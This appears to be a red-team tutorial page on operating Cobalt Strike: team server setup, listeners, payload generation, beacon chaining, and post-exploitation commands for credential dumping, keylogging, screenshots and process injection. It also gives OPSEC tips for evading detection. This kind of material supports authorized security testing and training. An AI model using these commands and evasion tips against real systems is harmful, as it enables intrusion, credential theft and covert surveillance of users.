---
title: C2 - Cobalt Strike
category: Red Team
order: 3
---

**Cobalt Strike** was one of the first public red team command and control frameworks.

Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs.

Cobalt Strike is split into client and a server components. 

Check more info in the official documentation.

* [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)

# Installation

```
sudo apt-add-repository 'deb http://security.debian.org/debian-security stretch/updates main'
sudo apt-get update
sudo apt-get install openjdk-11-jdk
sudo apt install proxychains socat
sudo update-alternatives --config java #Select openjdk-11
```

# Starting the Team Server

The server, referred to as the team server, is the controller for the Beacon payload and the host for Cobalt Strike’s social engineering features. The team server also stores data collected by Cobalt Strike and it manages logging.

The server run on a **supported Linux** systems. To start the team server, execute the following command:

```
./teamserver <IP> <Password> <Malleable C2 Profile>

[*] Generating X509 certificate and keystore (for SSL)
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: eadd46ff4f74d582290ce1755513ddfc0ffd736f90bed5d8d662ee113faccb43
```
Once started we can launch the client and connect with the password used.

![](/hackingnotes/images/cobaltstrike-login.png)

Verify the server's fingerprint before connecting.

> **OPSEC Note:** The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn't expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN.


# Listeners

A listener is a host/port/protocol combination that listens for inconming communication from a beacon.

There are two types:

* **Egress**: This listener acts like a web server, where the Team Server and the Beacon will encapsulate their communication over HTTP protocol. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.

* **Peer-to-peer**: Allow beaacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.

In order to create a listener go to `Cobalt Strike -> Listeners` and click the button `Add`.

![](/hackingnotes/images/cobaltstrike-listener.png)

## Peer-to-Peer (P2P) listeners

Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are TCP and SMB.

Link beacon is specially useful when it comes to pivoting, and other situation where you need to spawn an additional beacon payload.

> **Note**: Help to keep the number of direct outbound connections.

We can create a P2P listener by selecting `Beacon SMB` or `Beacon TCP` payload.

If executing a P2P payload on a target manually, it won't appear in the UI until the `link` (for SMB Beacons) or `connect` (for TCP Beacons) command is used. You can also `unlink` P2P Beacons and then use `link` again from another Beacon to reorganise the chain.

Commands such as `spawn`, `spanwas`, `inject` and `jump` can be use with these payloads.

There are **no limit** of chain connections but if any of the middle beacons gets disconnected, all the child beacons would be disconnected, but we can `link` or `connect` another time.

### Beacon TCP

While creating the beacon we need to select the port where the target machine will listen and if we want that the target bind to localhost or in all interfaces.

![](/hackingnotes/images/cobaltstrike-listener-tcp-chain.png)

Once executed the payload for a `Beacon TCP` a listener will be launched waiting to a connection. In order to spawn the beacon we need to connect to it with the command `connect`.

Usage of command `connect`:
```
beacon> help connect
Use: connect [target]
     connect [target] [port]

Connect to a TCP Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon.

Use 'unlink' to disconnect from a TCP Beacon.
```
So we just need to select the host and the port.

```
beacon> connect 10.10.10.10 4444
```
After that a chain on beacons will be created.

![](/hackingnotes/images/cobaltstrike-listener-tcp-chain.png)

> **Note**: `Beacon TCP` binding in localhost are recommended to privilege escalations.

### Beacon SMB

While creating the beacon we only need to select the pipename that will be used.

![](/hackingnotes/images/cobaltstrike-listener-p2p.png)

Same as TCP the beacon will listen to a connection. In that case we need to link pipenames with `link` command.

We can list them with:

```
ls \\.\pipe\
```

Usage of `link` command:

```
beacon> help link
Use: link [target] [pipe]
     link [target]

Connect to an SMB Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon. Specify an explicit [pipe]
to link to that pipename. The default pipe from the current profile is
used otherwise.
```

So we just have to select the target and the chosen pipename in the listener creation.

```
beacon> link 10.10.10.10 \\10.10.10.10\pipe\interprocess_28
```
We can also use `link` command again to reorganize the chain after getting disconnected.

# Payloads

There are two types of payloads:

* **Staged**: Staged payloads are tiny, when executed the real shellcode is transfered and execute. 

* **Stageless**: It contains the whole shellcole which means is bigger than staged payloads.

> **OPSEC Note**: Staged payloads are useful when the delivery method is limited to an amount of data that we can send. However, they tend to have more indicators and is more detectable than stageless payloads.

Cobalt Strike can generate both staged and stageless payloads. On GUI if we see a `(S)` means that is *stageless*.

## Staged Payloads

Go to `Attacks -> Packages -> Windows Executable`:

![](/hackingnotes/images/cobaltstrike-staged.png)

## Stageless Payloads

Go to `Attacks -> Packages -> Windows Executable (S)`:

![](/hackingnotes/images/cobaltstrike-stageless.png)

> **OPSEC Note**: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.


# Beacon Interaction

To interact click on Interact with rigth-click:

![](/hackingnotes/images/cobaltstrike-interact.png)


To get a list of available commands type `help`.

```
beacon> help

Beacon Commands
===============

    Command                   Description
    -------                   -----------
    argue                     Spoof arguments for matching processes
    blockdlls                 Block non-Microsoft DLLs in child processes
    browserpivot              Setup a browser pivot session
    cancel                    Cancel a download that's in-progress
    cd                        Change directory
    checkin                   Call home and post data
    chromedump                Recover credentials from Google Chrome
    clear                     Clear beacon queue
    connect                   Connect to a Beacon peer over TCP
    covertvpn                 Deploy Covert VPN client
    cp                        Copy a file
    dcsync                    Extract a password hash from a DC
    desktop                   View and interact with target's desktop
    dllinject                 Inject a Reflective DLL into a process
    dllload                   Load DLL into a process with LoadLibrary()
    download                  Download a file
    downloads                 Lists file downloads in progress
    drives                    List drives on target
    elevate                   Spawn a session in an elevated context
    execute                   Execute a program on target (no output)
    execute-assembly          Execute a local .NET program in-memory on target
    exit                      Terminate the beacon session
    getprivs                  Enable system privileges on current token
    getsystem                 Attempt to get SYSTEM
    getuid                    Get User ID
    hashdump                  Dump password hashes
    help                      Help menu
    inject                    Spawn a session in a specific process
    inline-execute            Run a Beacon Object File in this session
    jobkill                   Kill a long-running post-exploitation task
    jobs                      List long-running post-exploitation tasks
    jump                      Spawn a session on a remote host
    kerberos_ccache_use       Apply kerberos ticket from cache to this session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    keylogger                 Start a keystroke logger
    kill                      Kill a process
    link                      Connect to a Beacon peer over a named pipe
    logonpasswords            Dump credentials and hashes with mimikatz
    ls                        List files
    make_token                Create a token to pass credentials
    mimikatz                  Runs a mimikatz command
    mkdir                     Make a directory
    mode dns                  Use DNS A as data channel (DNS beacon only)
    mode dns-txt              Use DNS TXT as data channel (DNS beacon only)
    mode dns6                 Use DNS AAAA as data channel (DNS beacon only)
    mv                        Move a file
    net                       Network and host enumeration tool
    note                      Assign a note to this Beacon       
    portscan                  Scan a network for open services
    powerpick                 Execute a command via Unmanaged PowerShell
    powershell                Execute a command via powershell.exe
    powershell-import         Import a powershell script
    ppid                      Set parent PID for spawned post-ex jobs
    printscreen               Take a single screenshot via PrintScr method
    ps                        Show process list
    psinject                  Execute PowerShell command in specific process
    pth                       Pass-the-hash using Mimikatz
    pwd                       Print current directory
    reg                       Query the registry
    remote-exec               Run a command on a remote host
    rev2self                  Revert to original token
    rm                        Remove a file or folder
    rportfwd                  Setup a reverse port forward
    rportfwd_local            Setup a reverse port forward via Cobalt Strike client
    run                       Execute a program on target (returns output)
    runas                     Execute a program as another user
    runasadmin                Execute a program in an elevated context
    runu                      Execute a program under another PID
    screenshot                Take a single screenshot
    screenwatch               Take periodic screenshots of desktop
    setenv                    Set an environment variable
    shell                     Execute a command via cmd.exe
    shinject                  Inject shellcode into a process
    shspawn                   Spawn process and inject shellcode into it
    sleep                     Set beacon sleep time
    socks                     Start SOCKS4a server to relay traffic
    socks stop                Stop SOCKS4a server
    spawn                     Spawn a session 
    spawnas                   Spawn a session as another user
    spawnto                   Set executable to spawn processes into
    spawnu                    Spawn a session under another process
    spunnel                   Spawn and tunnel an agent via rportfwd
    spunnel_local             Spawn and tunnel an agent via Cobalt Strike client rportfwd
    ssh                       Use SSH to spawn an SSH session on a host
    ssh-key                   Use SSH to spawn an SSH session on a host
    steal_token               Steal access token from a process
    timestomp                 Apply timestamps from one file to another
    unlink                    Disconnect from parent Beacon
    upload                    Upload a file
```

## Help <command>

We can also get help of a command with `help <command>`:

```
beacon> help sleep
Use: sleep [time in seconds] <jitter>

Change how often the beacon calls home. Use sleep 0 to force Beacon to call 
home many times each second. 

Specify a jitter value (0-99) to force Beacon to randomly modify its sleep time.
```

> **Note**: Parameters wrapped in `[ ]` are mandatory, whilst those in `< >` are optional although the default value maybe in not the best option.



## Sleep

With `sleep` command we can modify the time when the beacon checks into the team server, by default is setted to 60 seconds.

```
beacon> sleep 5
[*] Tasked beacon to sleep for 5s
[+] host called home, sent: 16 bytes
```

> **OPSEC Note**: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage.

## Execute Assembly

The `execute-assembly` command allows the beacon to run `.NET` executables directly from memory.

```
beacon> execute-assembly C:\Tools\Tool.exe
```

# Hosting Files

Cobalt Strike allows us to host files in his web server. Go to `Attacks -> Web Drive-by -> Host File`.


![](/hackingnotes/images/cobaltstrike-hostfile.png)


# Screenshots

We can retrieve important information doing screenshots of the user's desktop. We can retrieve shortcuts they have, what documents they're looking and so on.

Screenshots are stored in `View -> Screenshots`.

Beacon has multiple commands to take screenshots.

* **printscreen**: Take a single screenshot via PrintScr method.
```
beacon> printscreen
```

* **screenhost**: Take a single screenshot.
```
beacon> screenhost
```

* **screenwatch**: Take periodic screenshots.
```
beacon> screenwatch
```

# Keylogger

A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data.

We can see the output of the keylogger in `View -> Keystrokes`.

```
beacon> keylogger
```

The keylogger runs as a job that can be stopped with the jobkill command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1
```